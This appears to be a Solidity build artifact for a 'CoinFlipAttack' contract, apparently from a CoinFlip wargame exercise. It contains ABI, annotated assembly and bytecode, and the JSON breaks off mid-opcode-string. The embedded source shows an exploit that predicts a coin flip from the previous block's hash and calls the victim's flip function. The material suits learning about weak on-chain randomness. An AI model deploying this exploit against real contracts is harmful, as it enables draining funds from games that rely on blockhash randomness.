{
	"contracts/CoinFlipAttack.sol": {
		"CoinFlipAttack": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "_victimContract",
							"type": "address"
						}
					],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"inputs": [],
					"name": "flipAttack",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "victimContract",
					"outputs": [
						{
							"internalType": "contract CoinFlip",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"contracts/CoinFlipAttack.sol\":91:604  contract CoinFlipAttack {... */\n  mstore(0x40, 0x80)\n    /* \"contracts/CoinFlipAttack.sol\":175:252  57896044618658097711785492504343953926634992332820282019728792003956564819968 */\n  0x8000000000000000000000000000000000000000000000000000000000000000\n    /* \"contracts/CoinFlipAttack.sol\":158:252  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968 */\n  0x01\n  sstore\n    /* \"contracts/CoinFlipAttack.sol\":259:355  constructor(address _victimContract) {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  revert(0x00, 0x00)\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_2\n  swap2\n  swap1\n  tag_3\n  jump\t// in\ntag_2:\n    /* \"contracts/CoinFlipAttack.sol\":332:347  _victimContract */\n  dup1\n    /* \"contracts/CoinFlipAttack.sol\":306:320  victimContract */\n  0x00\n  0x00\n    /* \"contracts/CoinFlipAttack.sol\":306:348  victimContract = CoinFlip(_victimContract) */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contracts/CoinFlipAttack.sol\":259:355  constructor(address _victimContract) {... */\n  pop\n    /* \"contracts/CoinFlipAttack.sol\":91:604  contract CoinFlipAttack {... */\n  jump(tag_6)\n    /* \"#utility.yul\":88:205   */\ntag_8:\n    /* \"#utility.yul\":197:198   */\n  0x00\n    /* \"#utility.yul\":194:195   */\n  0x00\n    /* \"#utility.yul\":187:199   */\n  revert\n    /* \"#utility.yul\":334:460   */\ntag_10:\n    /* \"#utility.yul\":371:378   */\n  0x00\n    /* \"#utility.yul\":411:453   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":404:409   */\n  dup3\n    /* \"#utility.yul\":400:454   */\n  and\n    /* \"#utility.yul\":389:454   */\n  swap1\n  pop\n    /* \"#utility.yul\":334:460   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":466:562   */\ntag_11:\n    /* \"#utility.yul\":503:510   */\n  0x00\n    /* \"#utility.yul\":532:556   */\n  tag_20\n    /* \"#utility.yul\":550:555   */\n  dup3\n    /* \"#utility.yul\":532:556   */\n  tag_10\n  jump\t// in\ntag_20:\n    /* \"#utility.yul\":521:556   */\n  swap1\n  pop\n    /* \"#utility.yul\":466:562   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":568:690   */\ntag_12:\n    /* \"#utility.yul\":641:665   */\n  tag_22\n    /* \"#utility.yul\":659:664   */\n  dup2\n    /* \"#utility.yul\":641:665   */\n  tag_11\n  jump\t// in\ntag_22:\n    /* \"#utility.yul\":634:639   */\n  dup2\n    /* \"#utility.yul\":631:666   */\n  eq\n    /* \"#utility.yul\":621:684   */\n  tag_23\n  jumpi\n    /* \"#utility.yul\":680:681   */\n  0x00\n    /* \"#utility.yul\":677:678   */\n  0x00\n    /* \"#utility.yul\":670:682   */\n  revert\n    /* \"#utility.yul\":621:684   */\ntag_23:\n    /* \"#utility.yul\":568:690   */\n  pop\n  jump\t// out\n    /* \"#utility.yul\":696:839   */\ntag_13:\n    /* \"#utility.yul\":753:758   */\n  0x00\n    /* \"#utility.yul\":784:790   */\n  dup2\n    /* \"#utility.yul\":778:791   */\n  mload\n    /* \"#utility.yul\":769:791   */\n  swap1\n  pop\n    /* \"#utility.yul\":800:833   */\n  tag_25\n    /* \"#utility.yul\":827:832   */\n  dup2\n    /* \"#utility.yul\":800:833   */\n  tag_12\n  jump\t// in\ntag_25:\n    /* \"#utility.yul\":696:839   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":845:1196   */\ntag_3:\n    /* \"#utility.yul\":915:921   */\n  0x00\n    /* \"#utility.yul\":964:966   */\n  0x20\n    /* \"#utility.yul\":952:961   */\n  dup3\n    /* \"#utility.yul\":943:950   */\n  dup5\n    /* \"#utility.yul\":939:962   */\n  sub\n    /* \"#utility.yul\":935:967   */\n  slt\n    /* \"#utility.yul\":932:1051   */\n  iszero\n  tag_27\n  jumpi\n    /* \"#utility.yul\":970:1049   */\n  tag_28\n  tag_8\n  jump\t// in\ntag_28:\n    /* \"#utility.yul\":932:1051   */\ntag_27:\n    /* \"#utility.yul\":1090:1091   */\n  0x00\n    /* \"#utility.yul\":1115:1179   */\n  tag_29\n    /* \"#utility.yul\":1171:1178   */\n  dup5\n    /* \"#utility.yul\":1162:1168   */\n  dup3\n    /* \"#utility.yul\":1151:1160   */\n  dup6\n    /* \"#utility.yul\":1147:1169   */\n  add\n    /* \"#utility.yul\":1115:1179   */\n  tag_13\n  jump\t// in\ntag_29:\n    /* \"#utility.yul\":1105:1179   */\n  swap2\n  pop\n    /* \"#utility.yul\":1061:1189   */\n  pop\n    /* \"#utility.yul\":845:1196   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"contracts/CoinFlipAttack.sol\":91:604  contract CoinFlipAttack {... */\ntag_6:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contracts/CoinFlipAttack.sol\":91:604  contract CoinFlipAttack {... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      revert(0x00, 0x00)\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x987a4e26\n      eq\n      tag_3\n      jumpi\n      dup1\n      0xf32d251d\n      eq\n      tag_4\n      jumpi\n    tag_2:\n      revert(0x00, 0x00)\n        /* \"contracts/CoinFlipAttack.sol\":365:602  function flipAttack() public {... */\n    tag_3:\n      tag_5\n      tag_6\n      jump\t// in\n    tag_5:\n      stop\n        /* \"contracts/CoinFlipAttack.sol\":121:152  CoinFlip public  victimContract */\n    tag_4:\n      tag_7\n      tag_8\n      jump\t// in\n    tag_7:\n      mload(0x40)\n      tag_9\n      swap2\n      swap1\n      tag_10\n      jump\t// in\n    tag_9:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/CoinFlipAttack.sol\":365:602  function flipAttack() public {... */\n    tag_6:\n        /* \"contracts/CoinFlipAttack.sol\":404:422  uint256 blockValue */\n      0x00\n        /* \"contracts/CoinFlipAttack.sol\":458:459  1 */\n      0x01\n        /* \"contracts/CoinFlipAttack.sol\":443:455  block.number */\n      number\n        /* \"contracts/CoinFlipAttack.sol\":443:459  block.number - 1 */\n      tag_12\n      swap2\n      swap1\n      tag_13\n      jump\t// in\n    tag_12:\n        /* \"contracts/CoinFlipAttack.sol\":433:460  blockhash(block.number - 1) */\n      blockhash\n        /* \"contracts/CoinFlipAttack.sol\":425:461  uint256(blockhash(block.number - 1)) */\n      0x00\n      shr\n        /* \"contracts/CoinFlipAttack.sol\":404:461  uint256 blockValue = uint256(blockhash(block.number - 1)) */\n      swap1\n      pop\n        /* \"contracts/CoinFlipAttack.sol\":472:488  uint256 coinFlip */\n      0x00\n        /* \"contracts/CoinFlipAttack.sol\":504:510  FACTOR */\n      sload(0x01)\n        /* \"contracts/CoinFlipAttack.sol\":491:501  blockValue */\n      dup3\n        /* \"contracts/CoinFlipAttack.sol\":491:510  blockValue / FACTOR */\n      tag_14\n      swap2\n      swap1\n      tag_15\n      jump\t// in\n    tag_14:\n        /* \"contracts/CoinFlipAttack.sol\":472:510  uint256 coinFlip = blockValue / FACTOR */\n      swap1\n      pop\n        /* \"contracts/CoinFlipAttack.sol\":520:529  bool side */\n      0x00\n        /* \"contracts/CoinFlipAttack.sol\":544:545  1 */\n      0x01\n        /* \"contracts/CoinFlipAttack.sol\":532:540  coinFlip */\n      dup3\n        /* \"contracts/CoinFlipAttack.sol\":532:545  coinFlip == 1 */\n      eq\n        /* \"contracts/CoinFlipAttack.sol\":532:560  coinFlip == 1 ? true : false */\n      tag_16\n      jumpi\n        /* \"contracts/CoinFlipAttack.sol\":555:560  false */\n      0x00\n        /* \"contracts/CoinFlipAttack.sol\":532:560  coinFlip == 1 ? true : false */\n      jump(tag_17)\n    tag_16:\n        /* \"contracts/CoinFlipAttack.sol\":548:552  true */\n      0x01\n        /* \"contracts/CoinFlipAttack.sol\":532:560  coinFlip == 1 ? true : false */\n    tag_17:\n        /* \"contracts/CoinFlipAttack.sol\":520:560  bool side = coinFlip == 1 ? true : false */\n      swap1\n      pop\n        /* \"contracts/CoinFlipAttack.sol\":570:584  victimContract */\n      0x00\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/CoinFlipAttack.sol\":570:589  victimContract.flip */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x1d263f67\n        /* \"contracts/CoinFlipAttack.sol\":590:594  side */\n      dup3\n        /* \"contracts/CoinFlipAttack.sol\":570:595  victimContract.flip(side) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_18\n      swap2\n      swap1\n      tag_19\n      jump\t// in\n    tag_18:\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_21\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_21:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_22\n      swap2\n      swap1\n      tag_23\n      jump\t// in\n    tag_22:\n      pop\n        /* \"contracts/CoinFlipAttack.sol\":394:602  {... */\n      pop\n      pop\n      pop\n        /* \"contracts/CoinFlipAttack.sol\":365:602  function flipAttack() public {... */\n      jump\t// out\n        /* \"contracts/CoinFlipAttack.sol\":121:152  CoinFlip public  victimContract */\n    tag_8:\n      0x00\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"#utility.yul\":7:133   */\n    tag_24:\n        /* \"#utility.yul\":44:51   */\n      0x00\n        /* \"#utility.yul\":84:126   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":77:82   */\n      dup3\n        /* \"#utility.yul\":73:127   */\n      and\n        /* \"#utility.yul\":62:127   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:133   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":139:199   */\n    tag_25:\n        /* \"#utility.yul\":167:170   */\n      0x00\n        /* \"#utility.yul\":188:193   */\n      dup2\n        /* \"#utility.yul\":181:193   */\n      swap1\n      pop\n        /* \"#utility.yul\":139:199   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":205:347   */\n    tag_26:\n        /* \"#utility.yul\":255:264   */\n      0x00\n        /* \"#utility.yul\":288:341   */\n      tag_44\n        /* \"#utility.yul\":306:340   */\n      tag_45\n        /* \"#utility.yul\":315:339   */\n      tag_46\n        /* \"#utility.yul\":333:338   */\n      dup5\n        /* \"#utility.yul\":315:339   */\n      tag_24\n      jump\t// in\n    tag_46:\n        /* \"#utility.yul\":306:340   */\n      tag_25\n      jump\t// in\n    tag_45:\n        /* \"#utility.yul\":288:341   */\n      tag_24\n      jump\t// in\n    tag_44:\n        /* \"#utility.yul\":275:341   */\n      swap1\n      pop\n        /* \"#utility.yul\":205:347   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":353:479   */\n    tag_27:\n        /* \"#utility.yul\":403:412   */\n      0x00\n        /* \"#utility.yul\":436:473   */\n      tag_48\n        /* \"#utility.yul\":467:472   */\n      dup3\n        /* \"#utility.yul\":436:473   */\n      tag_26\n      jump\t// in\n    tag_48:\n        /* \"#utility.yul\":423:473   */\n      swap1\n      pop\n        /* \"#utility.yul\":353:479   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":485:626   */\n    tag_28:\n        /* \"#utility.yul\":550:559   */\n      0x00\n        /* \"#utility.yul\":583:620   */\n      tag_50\n        /* \"#utility.yul\":614:619   */\n      dup3\n        /* \"#utility.yul\":583:620   */\n      tag_27\n      jump\t// in\n    tag_50:\n        /* \"#utility.yul\":570:620   */\n      swap1\n      pop\n        /* \"#utility.yul\":485:626   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":632:793   */\n    tag_29:\n        /* \"#utility.yul\":734:786   */\n      tag_52\n        /* \"#utility.yul\":780:785   */\n      dup2\n        /* \"#utility.yul\":734:786   */\n      tag_28\n      jump\t// in\n    tag_52:\n        /* \"#utility.yul\":729:732   */\n      dup3\n        /* \"#utility.yul\":722:787   */\n      mstore\n        /* \"#utility.yul\":632:793   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":799:1051   */\n    tag_10:\n        /* \"#utility.yul\":907:911   */\n      0x00\n        /* \"#utility.yul\":945:947   */\n      0x20\n        /* \"#utility.yul\":934:943   */\n      dup3\n        /* \"#utility.yul\":930:948   */\n      add\n        /* \"#utility.yul\":922:948   */\n      swap1\n      pop\n        /* \"#utility.yul\":958:1044   */\n      tag_54\n        /* \"#utility.yul\":1041:1042   */\n      0x00\n        /* \"#utility.yul\":1030:1039   */\n      dup4\n        /* \"#utility.yul\":1026:1043   */\n      add\n        /* \"#utility.yul\":1017:1023   */\n      dup5\n        /* \"#utility.yul\":958:1044   */\n      tag_29\n      jump\t// in\n    tag_54:\n        /* \"#utility.yul\":799:1051   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1057:1134   */\n    tag_30:\n        /* \"#utility.yul\":1094:1101   */\n      0x00\n        /* \"#utility.yul\":1123:1128   */\n      dup2\n        /* \"#utility.yul\":1112:1128   */\n      swap1\n      pop\n        /* \"#utility.yul\":1057:1134   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1140:1320   */\n    tag_31:\n        /* \"#utility.yul\":1188:1265   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":1185:1186   */\n      0x00\n        /* \"#utility.yul\":1178:1266   */\n      mstore\n        /* \"#utility.yul\":1285:1289   */\n      0x11\n        /* \"#utility.yul\":1282:1283   */\n      0x04\n        /* \"#utility.yul\":1275:1290   */\n      mstore\n        /* \"#utility.yul\":1309:1313   */\n      0x24\n        /* \"#utility.yul\":1306:1307   */\n      0x00\n        /* \"#utility.yul\":1299:1314   */\n      revert\n        /* \"#utility.yul\":1326:1520   */\n    tag_13:\n        /* \"#utility.yul\":1366:1370   */\n      0x00\n        /* \"#utility.yul\":1386:1406   */\n      tag_58\n        /* \"#utility.yul\":1404:1405   */\n      dup3\n        /* \"#utility.yul\":1386:1406   */\n      tag_30\n      jump\t// in\n    tag_58:\n        /* \"#utility.yul\":1381:1406   */\n      swap2\n      pop\n        /* \"#utility.yul\":1420:1440   */\n      tag_59\n        /* \"#utility.yul\":1438:1439   */\n      dup4\n        /* \"#utility.yul\":1420:1440   */\n      tag_30\n      jump\t// in\n    tag_59:\n        /* \"#utility.yul\":1415:1440   */\n      swap3\n      pop\n        /* \"#utility.yul\":1464:1465   */\n      dup3\n        /* \"#utility.yul\":1461:1462   */\n      dup3\n        /* \"#utility.yul\":1457:1466   */\n      sub\n        /* \"#utility.yul\":1449:1466   */\n      swap1\n      pop\n        /* \"#utility.yul\":1488:1489   */\n      dup2\n        /* \"#utility.yul\":1482:1486   */\n      dup2\n        /* \"#utility.yul\":1479:1490   */\n      gt\n        /* \"#utility.yul\":1476:1513   */\n      iszero\n      tag_60\n      jumpi\n        /* \"#utility.yul\":1493:1511   */\n      tag_61\n      tag_31\n      jump\t// in\n    tag_61:\n        /* \"#utility.yul\":1476:1513   */\n    tag_60:\n        /* \"#utility.yul\":1326:1520   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1526:1706   */\n    tag_32:\n        /* \"#utility.yul\":1574:1651   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":1571:1572   */\n      0x00\n        /* \"#utility.yul\":1564:1652   */\n      mstore\n        /* \"#utility.yul\":1671:1675   */\n      0x12\n        /* \"#utility.yul\":1668:1669   */\n      0x04\n        /* \"#utility.yul\":1661:1676   */\n      mstore\n        /* \"#utility.yul\":1695:1699   */\n      0x24\n        /* \"#utility.yul\":1692:1693   */\n      0x00\n        /* \"#utility.yul\":1685:1700   */\n      revert\n        /* \"#utility.yul\":1712:1897   */\n    tag_15:\n        /* \"#utility.yul\":1752:1753   */\n      0x00\n        /* \"#utility.yul\":1769:1789   */\n      tag_64\n        /* \"#utility.yul\":1787:1788   */\n      dup3\n        /* \"#utility.yul\":1769:1789   */\n      tag_30\n      jump\t// in\n    tag_64:\n        /* \"#utility.yul\":1764:1789   */\n      swap2\n      pop\n        /* \"#utility.yul\":1803:1823   */\n      tag_65\n        /* \"#utility.yul\":1821:1822   */\n      dup4\n        /* \"#utility.yul\":1803:1823   */\n      tag_30\n      jump\t// in\n    tag_65:\n        /* \"#utility.yul\":1798:1823   */\n      swap3\n      pop\n        /* \"#utility.yul\":1842:1843   */\n      dup3\n        /* \"#utility.yul\":1832:1867   */\n      tag_66\n      jumpi\n        /* \"#utility.yul\":1847:1865   */\n      tag_67\n      tag_32\n      jump\t// in\n    tag_67:\n        /* \"#utility.yul\":1832:1867   */\n    tag_66:\n        /* \"#utility.yul\":1889:1890   */\n      dup3\n        /* \"#utility.yul\":1886:1887   */\n      dup3\n        /* \"#utility.yul\":1882:1891   */\n      div\n        /* \"#utility.yul\":1877:1891   */\n      swap1\n      pop\n        /* \"#utility.yul\":1712:1897   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1903:1993   */\n    tag_33:\n        /* \"#utility.yul\":1937:1944   */\n      0x00\n        /* \"#utility.yul\":1980:1985   */\n      dup2\n        /* \"#utility.yul\":1973:1986   */\n      iszero\n        /* \"#utility.yul\":1966:1987   */\n      iszero\n        /* \"#utility.yul\":1955:1987   */\n      swap1\n      pop\n        /* \"#utility.yul\":1903:1993   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1999:2108   */\n    tag_34:\n        /* \"#utility.yul\":2080:2101   */\n      tag_70\n        /* \"#utility.yul\":2095:2100   */\n      dup2\n        /* \"#utility.yul\":2080:2101   */\n      tag_33\n      jump\t// in\n    tag_70:\n        /* \"#utility.yul\":2075:2078   */\n      dup3\n        /* \"#utility.yul\":2068:2102   */\n      mstore\n        /* \"#utility.yul\":1999:2108   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2114:2324   */\n    tag_19:\n        /* \"#utility.yul\":2201:2205   */\n      0x00\n        /* \"#utility.yul\":2239:2241   */\n      0x20\n        /* \"#utility.yul\":2228:2237   */\n      dup3\n        /* \"#utility.yul\":2224:2242   */\n      add\n        /* \"#utility.yul\":2216:2242   */\n      swap1\n      pop\n        /* \"#utility.yul\":2252:2317   */\n      tag_72\n        /* \"#utility.yul\":2314:2315   */\n      0x00\n        /* \"#utility.yul\":2303:2312   */\n      dup4\n        /* \"#utility.yul\":2299:2316   */\n      add\n        /* \"#utility.yul\":2290:2296   */\n      dup5\n        /* \"#utility.yul\":2252:2317   */\n      tag_34\n      jump\t// in\n    tag_72:\n        /* \"#utility.yul\":2114:2324   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2411:2528   */\n    tag_36:\n        /* \"#utility.yul\":2520:2521   */\n      0x00\n        /* \"#utility.yul\":2517:2518   */\n      0x00\n        /* \"#utility.yul\":2510:2522   */\n      revert\n        /* \"#utility.yul\":2657:2773   */\n    tag_38:\n        /* \"#utility.yul\":2727:2748   */\n      tag_77\n        /* \"#utility.yul\":2742:2747   */\n      dup2\n        /* \"#utility.yul\":2727:2748   */\n      tag_33\n      jump\t// in\n    tag_77:\n        /* \"#utility.yul\":2720:2725   */\n      dup2\n        /* \"#utility.yul\":2717:2749   */\n      eq\n        /* \"#utility.yul\":2707:2767   */\n      tag_78\n      jumpi\n        /* \"#utility.yul\":2763:2764   */\n      0x00\n        /* \"#utility.yul\":2760:2761   */\n      0x00\n        /* \"#utility.yul\":2753:2765   */\n      revert\n        /* \"#utility.yul\":2707:2767   */\n    tag_78:\n        /* \"#utility.yul\":2657:2773   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2779:2916   */\n    tag_39:\n        /* \"#utility.yul\":2833:2838   */\n      0x00\n        /* \"#utility.yul\":2864:2870   */\n      dup2\n        /* \"#utility.yul\":2858:2871   */\n      mload\n        /* \"#utility.yul\":2849:2871   */\n      swap1\n      pop\n        /* \"#utility.yul\":2880:2910   */\n      tag_80\n        /* \"#utility.yul\":2904:2909   */\n      dup2\n        /* \"#utility.yul\":2880:2910   */\n      tag_38\n      jump\t// in\n    tag_80:\n        /* \"#utility.yul\":2779:2916   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2922:3267   */\n    tag_23:\n        /* \"#utility.yul\":2989:2995   */\n      0x00\n        /* \"#utility.yul\":3038:3040   */\n      0x20\n        /* \"#utility.yul\":3026:3035   */\n      dup3\n        /* \"#utility.yul\":3017:3024   */\n      dup5\n        /* \"#utility.yul\":3013:3036   */\n      sub\n        /* \"#utility.yul\":3009:3041   */\n      slt\n        /* \"#utility.yul\":3006:3125   */\n      iszero\n      tag_82\n      jumpi\n        /* \"#utility.yul\":3044:3123   */\n      tag_83\n      tag_36\n      jump\t// in\n    tag_83:\n        /* \"#utility.yul\":3006:3125   */\n    tag_82:\n        /* \"#utility.yul\":3164:3165   */\n      0x00\n        /* \"#utility.yul\":3189:3250   */\n      tag_84\n        /* \"#utility.yul\":3242:3249   */\n      dup5\n        /* \"#utility.yul\":3233:3239   */\n      dup3\n        /* \"#utility.yul\":3222:3231   */\n      dup6\n        /* \"#utility.yul\":3218:3240   */\n      add\n        /* \"#utility.yul\":3189:3250   */\n      tag_39\n      jump\t// in\n    tag_84:\n        /* \"#utility.yul\":3179:3250   */\n      swap2\n      pop\n        /* \"#utility.yul\":3135:3260   */\n      pop\n        /* \"#utility.yul\":2922:3267   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa264697066735822122095598535040f4d928b04f0b5f86d1082bbc27f747f86c751e11a79e9ce98f39664736f6c634300081b0033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "60806040527f8000000000000000000000000000000000000000000000000000000000000000600155348015610033575f5ffd5b506040516104a63803806104a6833981810160405281019061005591906100f8565b805f5f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610123565b5f5ffd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100c78261009e565b9050919050565b6100d7816100bd565b81146100e1575f5ffd5b50565b5f815190506100f2816100ce565b92915050565b5f6020828403121561010d5761010c61009a565b5b5f61011a848285016100e4565b91505092915050565b610376806101305f395ff3fe608060405234801561000f575f5ffd5b5060043610610034575f3560e01c8063987a4e2614610038578063f32d251d14610042575b5f5ffd5b610040610060565b005b61004a610137565b60405161005791906101d5565b60405180910390f35b5f60014361006e9190610224565b405f1c90505f600154826100829190610284565b90505f60018214610093575f610096565b60015b90505f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16631d263f67826040518263ffffffff1660e01b81526004016100f191906102ce565b6020604051808303815f875af115801561010d573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906101319190610315565b50505050565b5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f819050919050565b5f61019d6101986101938461015b565b61017a565b61015b565b9050919050565b5f6101ae82610183565b9050919050565b5f6101bf826101a4565b9050919050565b6101cf816101b5565b82525050565b5f6020820190506101e85f8301846101c6565b92915050565b5f819050919050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f61022e826101ee565b9150610239836101ee565b9250828203905081811115610251576102506101f7565b5b92915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601260045260245ffd5b5f61028e826101ee565b9150610299836101ee565b9250826102a9576102a8610257565b5b828204905092915050565b5f8115159050919050565b6102c8816102b4565b82525050565b5f6020820190506102e15f8301846102bf565b92915050565b5f5ffd5b6102f4816102b4565b81146102fe575f5ffd5b50565b5f8151905061030f816102eb565b92915050565b5f6020828403121561032a576103296102e7565b5b5f61033784828501610301565b9150509291505056fea264697066735822122095598535040f4d928b04f0b5f86d1082bbc27f747f86c751e11a79e9ce98f39664736f6c634300081b0033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH32 0x8000000000000000000000000000000000000000000000000000000000000000 PUSH1 0x1 SSTORE CALLVALUE DUP1 ISZERO PUSH2 0x33 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x4A6 CODESIZE SUB DUP1 PUSH2 0x4A6 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x55 SWAP2 SWAP1 PUSH2 0xF8 JUMP JUMPDEST DUP1 PUSH0 PUSH0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0x123 JUMP JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xC7 DUP3 PUSH2 0x9E JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xD7 DUP2 PUSH2 0xBD JUMP JUMPDEST DUP2 EQ PUSH2 0xE1 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0xF2 DUP2 PUSH2 0xCE JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x10D JUMPI PUSH2 0x10C PUSH2 0x9A JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x11A DUP5 DUP3 DUP6 ADD PUSH2 0xE4 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x376 DUP1 PUSH2 0x130 PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x34 JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x987A4E26 EQ PUSH2 0x38 JUMPI DUP1 PUSH4 0xF32D251D EQ PUSH2 0x42 JUMPI JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH2 0x40 PUSH2 0x60 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x4A PUSH2 0x137 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x57 SWAP2 SWAP1 PUSH2 0x1D5 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH0 PUSH1 0x1 NUMBER PUSH2 0x6E SWAP2 SWAP1 PUSH2 0x224 JUMP JUMPDEST BLOCKHASH PUSH0 SHR SWAP1 POP PUSH0 PUSH1 0x1 SLOAD DUP3 PUSH2 0x82 SWAP2 SWAP1 PUSH2 0x284 JUMP JUMPDEST SWAP1 POP PUSH0 PUSH1 0x1 DUP3 EQ PUSH2 0x93 JUMPI PUSH0 PUSH2 0x96 JUMP JUMPDEST PUSH1 0x1 JUMPDEST SWAP1 POP PUSH0 PUSH0 SWAP1 SLOAD 